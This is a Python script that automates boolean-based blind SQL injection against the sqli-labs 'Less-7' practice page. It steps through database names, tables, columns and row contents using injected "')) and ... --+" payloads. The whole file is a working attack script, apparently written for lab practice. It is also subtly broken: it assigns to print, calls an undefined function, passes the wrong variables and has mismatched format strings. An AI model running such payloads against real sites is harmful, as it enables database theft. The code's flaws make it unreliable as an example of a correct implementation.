import requests

def ascii_table():
    str_list=[]
    for i in range(33,127):
        str_list.append(chr(i))
    return str_list

def db_length(url,str):
    print('[-]测试数据库名长度————————')
    num=1
    while True:
        payload=url+"')) and length(database())=%d--+" %num
        get=requests.get(payload)
        if str in get.text:
            db_length=num
            print("[+]数据库名长度：%d"%db_length)
            db_name(db_length)
            break
        else:
            num += 1

def db_name(db_length):
    print("[-]测试数据库名称长度——————————")
    db_name=''
    str_list=ascii_table()
    for i in range (1,db_length+1):
        for j in str_list:
            payload=url+"')) and (ord(left(database(),%d,1))='%s')--+"%(i,ord(j))
            get=requests.get(payload)
            if str in get.text:
                db_name += j
                break
    print("[+]数据库名: %s"%db_name)
    table_number(db_name)
    return db_name

def table_number(db_name):
    print("[-]测试有多少张表——————————")
    table_list=[]
    for i in range(100):
        payload=url+"')) and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+"%(i,db_name)
        get = requests.get(payload)
        if str in get.text:
            payload = i
            break
    print(db_name,payload)
    table_name(db_name,table_number)


def table_name(db_name,table_number):
    print("[-]开始测试表名长度——————————")
    table_list=[]
    for i in range(table_number):
        str_list=ascii_table();
        table_length=0
        table_name=''
        for j in range(1,20):
            payload=url+"')) and (select length(table_name) from information_schema.tables where table_schema='%s')--+"%(i,db_name)
            get=requests.get(payload)
            if str in get.text:
                table_number=j
                print=("第%d张表长度->%s"%(i+1,db_length))
                for c in range(1,table_length+1):
                    for l in str_list:
                        payload=url+"')) and (select ord(left((select table_name from information_schema.tables where=database() limit %d,1),%d,1)))=%d--+"%(i,c,ord(l))
                        get=requests.get(payload)
                        if str in get.text:
                            payload += l
                print=("[+]:%s"%table_name)
                table_list.append(table_name)
                break
    print("[+]%s库下的%s表:%s\n"%(db_name,table_number,table_list))
    column_number(table_list,db_name)


def column_number(table_list,db_name):
    print("[-]开始测试每张表的字段数——————————")
    column_number_list=[]
    for i in table_list:
        for j in range(30):
            payload=url+"')) %d=(select count(column_name) from information_schema.columns where table_name='%s')--+"%(j,i)
            get=requests.get(payload)
            if str in get.text:
                column_number=j
                column_number_list.append(column_number)
                print("[+]%s表\t%s个字段"%(i,column_number))
                break
    print("\n[+]表对应的字段数:%s\n"%column_number_list)
    column_name(table_list,column_number_list,db_name)


def column_name(table_list,column_number_list,db_name):
    print("[-]开始测试每张表的字段名————————————")
    column_length=[]
    str_list=ascii_str()
    column_name_list=[]
    for t in range(len(table_list)):
        print("\n[+]%s表的字段:"%table_list[t])
        for i in range(column_number_list[t]):
            column_name=''
            for j in range(1,21):
                payload=url+"')) and %d=(select length(column_name) from information_schema.columns where table_name='%s' limit %d,1)--+"%(j-1,table_list[t],i)
                get=requests.get(payload)
                if str in get.text:
                    column_length.append(j)
                    break
                for k in str_list:
                    column_payload=url+"')) and ord(left((select column_name from information_schema.columns where table_name='%s' limit %d),%d,1))=%d--+"%(table_list[t],i,j,ord(k))
                    get=requests.get(column_payload)
                    if str in get.text:
                        column_name+=k
            print("[+]:%s"%column_name)
            column_name_list.append(column_name)
    content(table_list,column_name_list,db_name)


def content(table_list,column_name_list,db_name):
    print("[-]开始爆破%s表中内容——————————————————————\n"%(table_list[3],column_name_list[9:12]))
    str_list=ascii_str()
    for i in column_name_list[9:12]:
        for j in range(101):
            content_number_payload=url+"')) and (select count(%s) from %s,%s)=%d--+"%(i,db_name,table_list[3],j)
            get=requests.get(content_number_payload)
            if str in get.text:
                conctent_number=j
                break
        print("\n[+]%s表中的%s字段一下%s条数据:"%(table_list[3],i,content_number))
        for k in range(content_number):
            content_len=0
            db_content=''
            for l in range(1,21):
                content_len_payload=url+"')) ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+"%(i,db_name,table_list[3],k,l)
                get=requests.get(content_len_payload)
                if str in get.text:
                    content=l-1
                    for x in range(1,content_len+1):
                        for y in str_list:
                            content_payload=url+"')) and ord(left((select %s from %s.%s limit %d,1),%d,1))=%d--+"%(i,db_name,table_list[3],k,x,y)
                            get=requests.get(content_payload)
                            if str in get.text:
                                content+=y
                                break
                    break 


if __name__ == "__main__":
    url='http://10.5.100.146:8081/Less-7/?id=1'
    str='You are in.... Use outfile......'
    db_length(url,str)
